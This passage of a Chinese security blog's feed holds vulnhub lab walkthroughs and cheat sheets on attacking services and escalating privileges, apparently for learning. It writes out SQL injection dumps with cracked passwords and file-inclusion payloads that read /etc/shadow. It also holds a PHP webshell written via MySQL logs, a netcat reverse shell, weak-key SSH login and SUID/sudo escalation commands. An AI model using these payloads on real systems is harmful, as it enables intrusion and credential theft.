class="header-anchor" href="#附录">¶</a>附录</h2><h3 id="临时服务器"><a class="header-anchor" href="#临时服务器">¶</a>临时服务器</h3><p>除了用python开启一个临时服务器, 还可以用php:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -S 0:80</span><br></pre></td></tr></table></figure><h3 id="公钥破解getshell"><a class="header-anchor" href="#公钥破解getshell">¶</a>公钥破解getshell</h3><p>服务器管理员登录可能会使用ssh密钥登录, 这个密钥一般在<code>.ssh/authorized_keys</code>文件中</p><p>还记得前面webmin是root权限么, 我们用它来读取公钥文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl 2017.pl 192.168.110.128 10000 /home/vmware/.ssh/authorized_keys 0</span><br></pre></td></tr></table></figure><p>拿到公钥之后需要用自己的私钥进行碰撞, 利用伪随机数生成器尝试爆破</p><blockquote><p>prng：pseudo random number generator（伪随机数生成器）</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit prng</span><br><span class="line"><span class="comment"># 选择和OpenSSL相关的</span></span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/remote/5622.txt 5622.txt</span><br></pre></td></tr></table></figure><p>简单翻译一下</p><ol><li>下载文件</li><li>将其提取到一个目录</li><li>在 /root/.ssh/authorized_keys 中输入一个 2048 位的 SSH RSA 密钥，该密钥是在一个没有修补的 Debian 系统上生成的（这是这个漏洞将破坏的密钥）</li><li>运行 Perl 脚本，并提供你提取 bzip2 文件的位置</li></ol><p>听不太懂在说什么, 反正就是个库用于碰撞的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar vjxf 5622.tar.bz2</span><br></pre></td></tr></table></figure><p>解压完, 多了一个叫做rsa的目录; 这个目录下有很多名称一样文件对, 分别是公钥和私钥, 扩展名带有.pub的是公钥</p><p>我们直接用grep进行搜索内容即可, 仅匹配部分, 然后再找出来匹配全部不就好了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -lr <span class="string">&#x27;AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>-l: 会输出包含匹配字符串的文件名-r: 搜索指定目录中的所有文件及其子目录</p></blockquote><p>找不到就换一个用户继续进行搜索, 这里找到了obama用户的公钥和一个文件的内容完全一样</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl 2017.pl 192.168.110.128 10000 /home/obama/.ssh/authorized_keys 0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312191801.png" alt="image.png"></p><p>将对应的私钥拿走, 在工作目录中利用其进行登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> dcbe2a56e8cdea6d17495f6648329ee2-4679 ../../</span><br><span class="line">ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -idcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.110.128</span><br></pre></td></tr></table></figure><p>给定了私钥但是还是向我们要密码, 奇怪了. 这时候可以添加参数<code>-vv</code>来看看是哪里出现了问题</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sign_and_send_pubkey: no mutual signature supported</span><br><span class="line"><span class="comment"># 客户端和服务器之间没有共同支持的签名算法来进行公钥认证</span></span><br></pre></td></tr></table></figure><p>那就给一个相同的pubkey, 成功拿到shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -idcbe2a56e8cdea6d17495f6648329ee2-4679 -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss obama@192.168.110.128</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312192815.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> shellshock </tag>
            
            <tag> 私钥碰撞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMPSecurity-CTF4</title>
      <link href="/article/LAMPSecurity-CTF4/"/>
      <url>/article/LAMPSecurity-CTF4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>LAMPSecurity-CTF4</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/lampsecurity-ctf4,83/">vulnhub靶场-LAMPSecurity: CTF4</a></p><p>目标: The idea of the exercise is to compromise the target WITHOUT knowing the username and password.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.110.130</li><li>target: 192.168.110.136</li></ul><p>咳, 据说这个靶机是2009年做的, 放在现在不能说漏洞百出, 只能说毫无防护</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取靶机地址 192.168.110.136</span></span><br><span class="line">sudo nmap -sn 192.168.110.0/24</span><br><span class="line"><span class="comment"># 获取端口信息 22,25,80,631</span></span><br><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.110.136 -oA scan/ports</span><br><span class="line"><span class="comment"># 获取详细信息</span></span><br><span class="line">sudo nmap -sT -sV -sC -O -p22,25,80,631 192.168.110.136 -oA scan/detail</span><br><span class="line"><span class="comment"># 看看漏洞</span></span><br><span class="line">sudo nmap --script=vuln -p22,25,80,631 192.168.110.136 -oA scan/vuln</span><br></pre></td></tr></table></figure><p>经过扫描, 端口631和端口25无法连接, 仅有22和80存活. 有新的目录</p><p>漏洞扫描扫到一些漏洞, 包括跨站请求伪造csrf、文件遍历、sql注入等</p><h3 id="80-http"><a class="header-anchor" href="#80-http">¶</a>80/http</h3><p>进去之后看不懂. 查看源码, 发现有一个注释掉的路由<code>/usage</code></p><p>仔细看看能不能利用, 发现要缓冲区溢出进行远程命令执行, 那太难受了, 先放一边吧</p><p>在点Blog后发现url存在id=2的字样, 结合之前搜到的sql漏洞, 猜测应该就是这里</p><p>测试id=5, 出现另一个博文, 加上单引号, 出现sql错误, 所以应该是存在漏洞的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.110.136/index.html?page=blog&amp;title=Blog&amp;id=5&#x27; --dbs --dump --batch</span><br></pre></td></tr></table></figure><p>在数据库ehks的表user中, 成功发现了几个用户名和密码, 且可以自动破解</p><table><thead><tr><th>user_id</th><th>user_name</th><th>user_pass</th></tr></thead><tbody><tr><td>1</td><td>dstevens</td><td>02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)</td></tr><tr><td>2</td><td>achen</td><td>b46265f1e7faa3beab09db5c28739380 (seventysixers)</td></tr><tr><td>3</td><td>pmoore</td><td>8f4743c04ed8e5f39166a81f26319bb5 (Homesite)</td></tr><tr><td>4</td><td>jdurbin</td><td>7c7bc9f465d86b8164686ebb5151a717 (Sue1978)</td></tr><tr><td>5</td><td>sorzek</td><td>64d1f88b9b276aece4b0edcc25b7a434 (pacman)</td></tr><tr><td>6</td><td>ghighland</td><td>9f3eb3087298ff21843cc4e013cf355f (undone1)</td></tr></tbody></table><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>利用sql注入得到的信息登录ssh, 结果发现不行. 报错提示&quot;没有匹配的key exchange方法&quot;，靶机的方法是diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1, 我们需要将这个参数传进去</p><p>而<code>ssh -o</code>的参数中有关于密钥的是KeyAlgorithms, 所以传入结果如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.110.136</span><br></pre></td></tr></table></figure><p>继续报错, 这次是&quot;没有匹配的key type&quot;, 添加对应参数即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss dstevens@192.168.110.136</span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux ctf4.sas.upenn.edu 2.6.15-1.2054_FC5 #1 Tue Mar 14 15:48:33 EST 2006 i686 i686 i386 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 2.6.15-1.2054_FC5</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 查看权限, 任意位置可以执行sudo命令</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, 无发现</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看计划任务, 无发现</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>所以可以直接利用sudo提权</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>有sudo权限那没什么好说的了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250304104434.png" alt="image.png"></p><p>官方文档中利用的是文件包含的方式, web的当前目录的<code>/restriced</code>路径下存在<code>.htpasswd</code>文件, 记录了账号密码</p><p>htpasswd是apache的一个组件, 用于http验证, 但其实<code>.htpasswd</code>文件并不存在默认路径, 这个restriced路径大概率是自己定义的</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务和端口利用</title>
      <link href="/article/server-and-ports/"/>
      <url>/article/server-and-ports/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>服务和端口利用</h1><h2 id="ftp-21"><a class="header-anchor" href="#ftp-21">¶</a>ftp/21</h2><p>匿名登录, 用户名anonymous, 密码为空</p><p>一进入ftp就要切换为二进制模式, 可以避免下载的可执行文件损坏, 命令为<code>binary</code></p><p>如果要下载多个文件, 首先利用<code>prompt</code>关闭交互式的提示模式, 随后用<code>mget *.txt</code>一次下载当前位置所有的txt文件</p><h2 id="ssh-22"><a class="header-anchor" href="#ssh-22">¶</a>ssh/22</h2><p>比较旧的版本可以用msf的脚本获取部分用户信息, 剩下的就是爆破或者信息收集从而登录</p><h2 id="stmp-25-信息枚举"><a class="header-anchor" href="#stmp-25-信息枚举">¶</a>stmp/25 信息枚举</h2><p>工具: smtp-user-enum命令</p><h2 id="dns-53-信息泄露"><a class="header-anchor" href="#dns-53-信息泄露">¶</a>dns/53 信息泄露</h2><p>DNS域传送漏洞, 允许任意IP主机向DNS服务器请求同步信息, 就会出现该漏洞</p><p>该命令的解释为: 从10.10.10.10主机的DNS服务上请求与test.com有关的所有域名解析关系条目</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig @10.10.10.10 axfr test.com</span><br></pre></td></tr></table></figure><h2 id="finger-79-信息泄露"><a class="header-anchor" href="#finger-79-信息泄露">¶</a>finger/79 信息泄露</h2><p>工具: finger命令</p><h2 id="pop3-110"><a class="header-anchor" href="#pop3-110">¶</a>pop3/110</h2><p>反正试过包含pop3日志达到getshell</p><h2 id="rpcbind-111-信息泄露"><a class="header-anchor" href="#rpcbind-111-信息泄露">¶</a>rpcbind/111 信息泄露</h2><p>简称rpc<code>rpcinfo -p 192.168.56.101</code></p><h2 id="smb-445"><a class="header-anchor" href="#smb-445">¶</a>smb/445</h2><p>永恒之蓝警告</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看共享文件夹信息</span></span><br><span class="line">smbmap -H 192.168.56.104 </span><br><span class="line"><span class="comment"># 查看详细信息</span></span><br><span class="line">smbclient //192.168.11.136/smbdata </span><br></pre></td></tr></table></figure><h2 id="nfs-2049"><a class="header-anchor" href="#nfs-2049">¶</a>nfs/2049</h2><p>nfs挂载 远程登录, 配合文件getshell/ssh毒化</p><p>NFS通常与 Kerberos 配对以实现强大的身份验证机制, 因为NFS本身仅根据用户的UID/GID对用户进行身份验证, 非常不安全</p><p>一旦NFS文件系统被远程主机以读/写权限成功挂载, 每个共享文件的唯一保护就是它的权限; 此权限绑定到用户的用户ID; 如果共享相同用户ID的两个用户挂载相同的NFS文件系统, 可以修改彼此的文件</p><p>如果目标没有 Kerberos 设置, 只需找到经过身份验证以使用NFS的用户的UID和GUID, 并创建具有相同UID和GUID的用户即可. 但是目标中如果没有任何用户的UID或GID, 这意味着即使挂载了该共享, 无法访问NFS共享</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可挂载目录</span></span><br><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 挂载到本地</span></span><br><span class="line">mount -t nfs 192.168.110.132:/home/vulnix /tmp/nfs</span><br></pre></td></tr></table></figure><h2 id="mysql-3306"><a class="header-anchor" href="#mysql-3306">¶</a>mysql/3306</h2><h3 id="直接写入木马"><a class="header-anchor" href="#直接写入木马">¶</a>直接写入木马</h3><p>要求: <code>secure_file_priv</code>变量非NULL, 用户拥有<code>root</code>权限, 知道当前网站的绝对路径</p><h3 id="日志文件写马"><a class="header-anchor" href="#日志文件写马">¶</a>日志文件写马</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查看是否满足第一条</span><br><span class="line">select @@secure_file_priv</span><br><span class="line">// 查看日志记录是否开启和查看路径</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">// 开启日志读写功能</span><br><span class="line">SET GLOBAL general_log=&#x27;on&#x27;; SHOW VARIABLES LIKE &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p>利用方式(蚁剑连接即可):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">select &#x27;一句话木马&#x27; into dumpfile/outfile &#x27;绝对路径&#x27;</span><br><span class="line">// 第二种</span><br><span class="line">SET GLOBAL general_log_file=&#x27;C:/www/shell.php&#x27;</span><br><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="MySQL-UDF"><a class="header-anchor" href="#MySQL-UDF">¶</a>MySQL UDF</h3><p>UDF(User Defined Function, 用户自定义函数), 可以通过UDF在Mysql中调用一些其原来不具备的功能. 提权需要的条件如下:</p><p>MySQL版本大于5, 且存在<code>lib_mysqludf_sys</code>, 查看是否存在方式如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql</span><br><span class="line">select * from func;</span><br></pre></td></tr></table></figure><p>如果没有, 则需要手动添加(稍微复杂)</p><blockquote><p>手动添加需要MySQL是以root权限启动, 这样能执行的命令才是root权限, 而自带的这个没说, 遇到了再说吧</p></blockquote><p>拥有该函数后, 可以有这些提权方法</p><ol><li>构建SUID程序</li><li>创建反弹shell</li><li>添加用户到管理员组</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 构建SUID程序, 常用find</span><br><span class="line">SELECT sys_exec(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"># 反弹shell到192.168.1.2</span><br><span class="line">SELECT sys_exec(&#x27;/bin/nc.traditional -e /bin/sh 192.168.1.2 1234&#x27;)</span><br><span class="line"># robert用户组更改</span><br><span class="line">SELECT sys_exec(&#x27;usermod -a -G admin robert&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权</title>
      <link href="/article/get-root/"/>
      <url>/article/get-root/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Linux</h1><h2 id="已知的可用来suid提权的文件-命令"><a class="header-anchor" href="#已知的可用来suid提权的文件-命令">¶</a>已知的可用来suid提权的文件/命令</h2><ul><li>nmap</li><li>vim</li><li>find</li><li>bash</li><li>more</li><li>less</li><li>nano</li><li>cp</li></ul><h2 id="利用enumy64分析权限"><a class="header-anchor" href="#利用enumy64分析权限">¶</a>利用enumy64分析权限</h2><p>enumy64: 是一款linux后渗透提权枚举工具，是一个快速的可移植、可执行文件</p><p>先在攻击机上开启web服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 10000</span><br></pre></td></tr></table></figure><p>然后利用wget让靶机从攻击机上下载这个文件, 给权限, 运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget 192.168.10.1:10000/enumy64</span><br><span class="line">chmod 777 enumy64</span><br><span class="line">./enumy64</span><br></pre></td></tr></table></figure><p>然后我们就可以得到一些有用的信息</p><p>类似的提权辅助工具: Linux-Exploit-Suggester</p><h2 id="连接shell后可以干的事"><a class="header-anchor" href="#连接shell后可以干的事">¶</a>连接shell后可以干的事</h2><p>查看计划任务、备份文件、suid的文件、可写文件等，总之寻找有没有一些ssh登录的凭据或是可以利用的提权文件</p><h2 id="利用计划任务进行提权"><a class="header-anchor" href="#利用计划任务进行提权">¶</a>利用计划任务进行提权</h2><p>主要看是不是用root权限执行某个文件, 可以是sh, 也可以是别的, 只要能执行指令就是好文件. 利用方式就是塞一个反弹shell代码进去即可</p><h2 id="利用msfconsole的edit修改文件提权"><a class="header-anchor" href="#利用msfconsole的edit修改文件提权">¶</a>利用msfconsole的edit修改文件提权</h2><p>meterpreter 下有个 edit 命令, 类似于 vim/etc/passwd 文件的第二位 x , 是密码占位符, 密码其实是加密存储在 /etc/shadow 下的可以假设 x 位密码存在, 那么root 就会默认密码为 x 位,  就不会去读取 /etc/shadow. 可以利用edit来进行编辑</p><p>利用<code>openssl passwd -1</code>, 生成密码, 密码明文为admin</p><p>输入<code>edit /etc/passwd</code>进行编辑(不一定每个靶机都行), 将之前生成的密码添加到root后的x位置</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313100249500.png" alt="111"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;// py重开终端</span><br><span class="line">su root// 输入admin</span><br></pre></td></tr></table></figure><h2 id="motd提权"><a class="header-anchor" href="#motd提权">¶</a>motd提权</h2><h2 id="contrab提权"><a class="header-anchor" href="#contrab提权">¶</a>contrab提权</h2><h2 id="namp提权"><a class="header-anchor" href="#namp提权">¶</a>namp提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -interactive</span><br></pre></td></tr></table></figure><h2 id="find提权"><a class="header-anchor" href="#find提权">¶</a>find提权</h2><p>检查find命令是否有suid权限，有suid权限可进行提权操作</p><p>查看find位置</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which find</span><br></pre></td></tr></table></figure><p>查看find权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -alh /usr/bin/find</span><br></pre></td></tr></table></figure><p>使用find命令查看拥有suid权限的文件, 这个常用来查找可能利用的文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>如果find命令没有suid权限，给find命令赋予suid权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod u+s /usr/bin/find</span><br></pre></td></tr></table></figure><p>find拥有suid权限位，尝试以find命令执行whoami, 看看是否为管理员权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find `which find` -exec whoami \;</span><br></pre></td></tr></table></figure><p>使用find命令来提权</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p>似乎说, bash 经常是被限制的,在受限模式下运行,如果 bash 不行就多试试 sh</p><h2 id="利用sudoers文件提权"><a class="header-anchor" href="#利用sudoers文件提权">¶</a>利用sudoers文件提权</h2><p>该文件包含了每个用户可以在不输入密码的情况下使用sudo命令的范围, 可能需要这个用户本来就有sudo权限用于打开一个编辑器来编辑该文件</p><blockquote><p>用<code>sudo -l</code>来查看权限</p></blockquote><p>在<code># User privilege specification</code>这个注释下对应的用户权限设定末尾增加<code>/bin/bash</code></p><h2 id="用过的脚本"><a class="header-anchor" href="#用过的脚本">¶</a>用过的脚本</h2><ol><li><code>40839.c</code>, <code>Linux Kernel 2.6.22&lt;3.9 - 'Dirty COW'</code> 这个利用/etc/passwd的方式利用, 比较稳定</li><li><code>44298</code>, <code>Linux Kernel &lt; 4.40-116(Ubuntu 16.04.4) - Local Privilege Escalation</code></li><li><code>45010</code></li></ol><h1>Windows</h1><p>安装了<code>KB2871997</code>补丁或者系统版本大于<code>windows server 2012</code>时, 系统的内存中就不再保存明文的密码, mimikatz失效</p><p>提权辅助工具: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>, 执行systeminfo获取信息之后可以扔给它</p><h2 id="win7"><a class="header-anchor" href="#win7">¶</a>win7</h2><h2 id="windows2003"><a class="header-anchor" href="#windows2003">¶</a>windows2003</h2><p>直接上巴西烤肉</p><table><thead><tr><th>补丁</th><th>对应漏洞</th></tr></thead><tbody><tr><td>KB2360937</td><td>Ms10-084</td></tr><tr><td>KB2478960</td><td>MS11-014</td></tr><tr><td>KB2507938</td><td>MS11-056</td></tr><tr><td>KB2566454</td><td>Ms11-062</td></tr><tr><td>KB2646524</td><td>MS12-003</td></tr><tr><td>KB2645640</td><td>Ms12-009</td></tr><tr><td>KB2641653</td><td>MS12-018</td></tr><tr><td>KB944653</td><td>MS07-067</td></tr></tbody></table><p>msf:</p><ul><li>exploit/windows/local/ms13_053_schlamperei</li><li>exploit/windows/local/ms13_081_track_popup_menu</li><li>MS16-032</li><li>ms17-010永恒之蓝</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>W1R3S-1.0.1</title>
      <link href="/article/W1R3S-1.0.1/"/>
      <url>/article/W1R3S-1.0.1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>W1R3S: 1.0.1</h1><hr><p>easyNo.12</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/w1r3s-101,220/">vulnhub靶场-W1R3S: 1.0.1</a></p><p>目标: They have asked you to gain root access and find the flag (located in /root directory).</p><p>提示: This is a vulnerable Ubuntu box.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.110.130</li><li>target: 192.168.110.135</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.110.0/24</span><br><span class="line">nmap -sn 192.168.110.0/24</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure><h3 id="21-ftp"><a class="header-anchor" href="#21-ftp">¶</a>21/ftp</h3><p>先看看ftp, 发现存在匿名登录. 上去将所有的txt文件都下载下来</p><p>分析文件, 有个md5值, 放到网上解出来是&quot;This is not a password&quot;, pass. 还有一个base64字符串, 试试解码, 发现也没用</p><p>然后是员工列表, 有经理, IT, web设计等. 结合职务猜测可能存在的权限和可能获得的数据</p><p>倒过来看最后一个, “我不认为这是获取root的方式”, 暗示ftp这个地方就是无用的, 那就拉倒了</p><h3 id="3306-mysql"><a class="header-anchor" href="#3306-mysql">¶</a>3306/mysql</h3><p>没有密码, 同时测试后发现不允许被登录, 暂时放弃</p><h3 id="80-http"><a class="header-anchor" href="#80-http">¶</a>80/http</h3><p>目录扫描, 发现存在wordpress和一个installation界面? 用于安装Cuppa CMS.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[08:05:48] 302 -    7KB - /administrator/</span><br><span class="line">[08:06:07] 301 -    0B  - /wordpress/</span><br><span class="line">[08:06:08] 200 -    1KB - /wordpress/wp-login.php</span><br></pre></td></tr></table></figure><p>发现访问wordpress后自动跳转<code>https://192.168.110.130/wordpress/</code>, 奇怪</p><p>尝试修改<code>/etc/host</code>文件, 使得localhost指向192.168.110.135(其实就是绑定域名). 然后失败了, 似乎kali不允许用户调整localhost指向非本机ip, 先放在一边</p><p>来看看Cuppa CMS这个安装界面, 我们没有数据库密码, 同时也不知道数据库有什么东西, 只能看看有什么了.</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250127211352.png" alt="image.png"></p><p>尝试安装, 但是他说管理员用户创建失败, 那这里也走不通</p><p>尝试搜索有没有可以利用的漏洞, 只有一条, 那就拿下来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br><span class="line">locate php/webapps/25971.txt</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/php/webapps/25971.txt ~/Desktop/working</span><br></pre></td></tr></table></figure><p>打开来看, 大概意思是在特定文件的22行有一段代码产生了文件包含的漏洞, 攻击这个可以利用这个去包含本地或远程的php文件, 或者读取非php文件</p><p>然后是给的一些示例, 比如获取<code>/etc/passwd</code>, 可以读取<code>Configuration.php</code>等等</p><p>先确认是否存在这个漏洞, 给的payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>结合靶机, 稍微修改一下payload. 原payload测试后是没有反应的, 猜测安装到的是<code>administrator</code>路径, 成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.110.135/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250129142939.png" alt="image.png"></p><p>结合图片, 发现没有得到预期输出<code>/etc/passwd</code>. 这里有两个方法: 一个是模糊测试, 更换一些参数/传参方式尝试利用 / 绕过一些限制. 另一个是找到对应版本或临近版本的源码进行代码审计</p><p>这边选择了上网寻找cuppa cms的源码: <a href="https://github.com/CuppaCMS/CuppaCMS">github-CuppaCMS</a></p><blockquote><p>搜索过程中还找到例如Cuppa CMS v1.0的RCE<code>CVE-2022-37190</code>, SQL注入<code>CVE-2022-24266</code>, 我们找到的这个txt文件说是2013.6.4, 但是还找到一个本地文件包含<code>CVE-2022-25486</code></p></blockquote><p>根据txt给出的路径顺利找到文件, 发现原来的第22行编程的第77行的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">&quot;../components/table_manager/fields/config/&quot;</span>.@<span class="variable">$cuppa</span>-&gt;<span class="title function_ invoke__">POST</span>(<span class="string">&quot;urlConfig&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>显然没有过滤, 只不过是更换传参方式为POST, 所以这个肯定存在文件包含</p><p>尝试利用curl传参, 让我试试curl(当然还可以利用hackbar之类的直接传). 然后成功获取内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --data-urlencode <span class="string">&#x27;urlConfig=../../../../../../../../../etc/passwd&#x27;</span> http://192.168.110.135/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250129143202.png" alt="image.png"></p><p>获取<code>/etc/shadow</code>, 然后利用john对密码哈希值进行爆破, 成功爆破两条</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --data-urlencode <span class="string">&#x27;urlConfig=../../../../../../../../../etc/shadow&#x27;</span> http://192.168.110.135/administrator/alerts/alertConfigField.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接将shadow中有哈希值的用户名储存然后交给john</span></span><br><span class="line">john 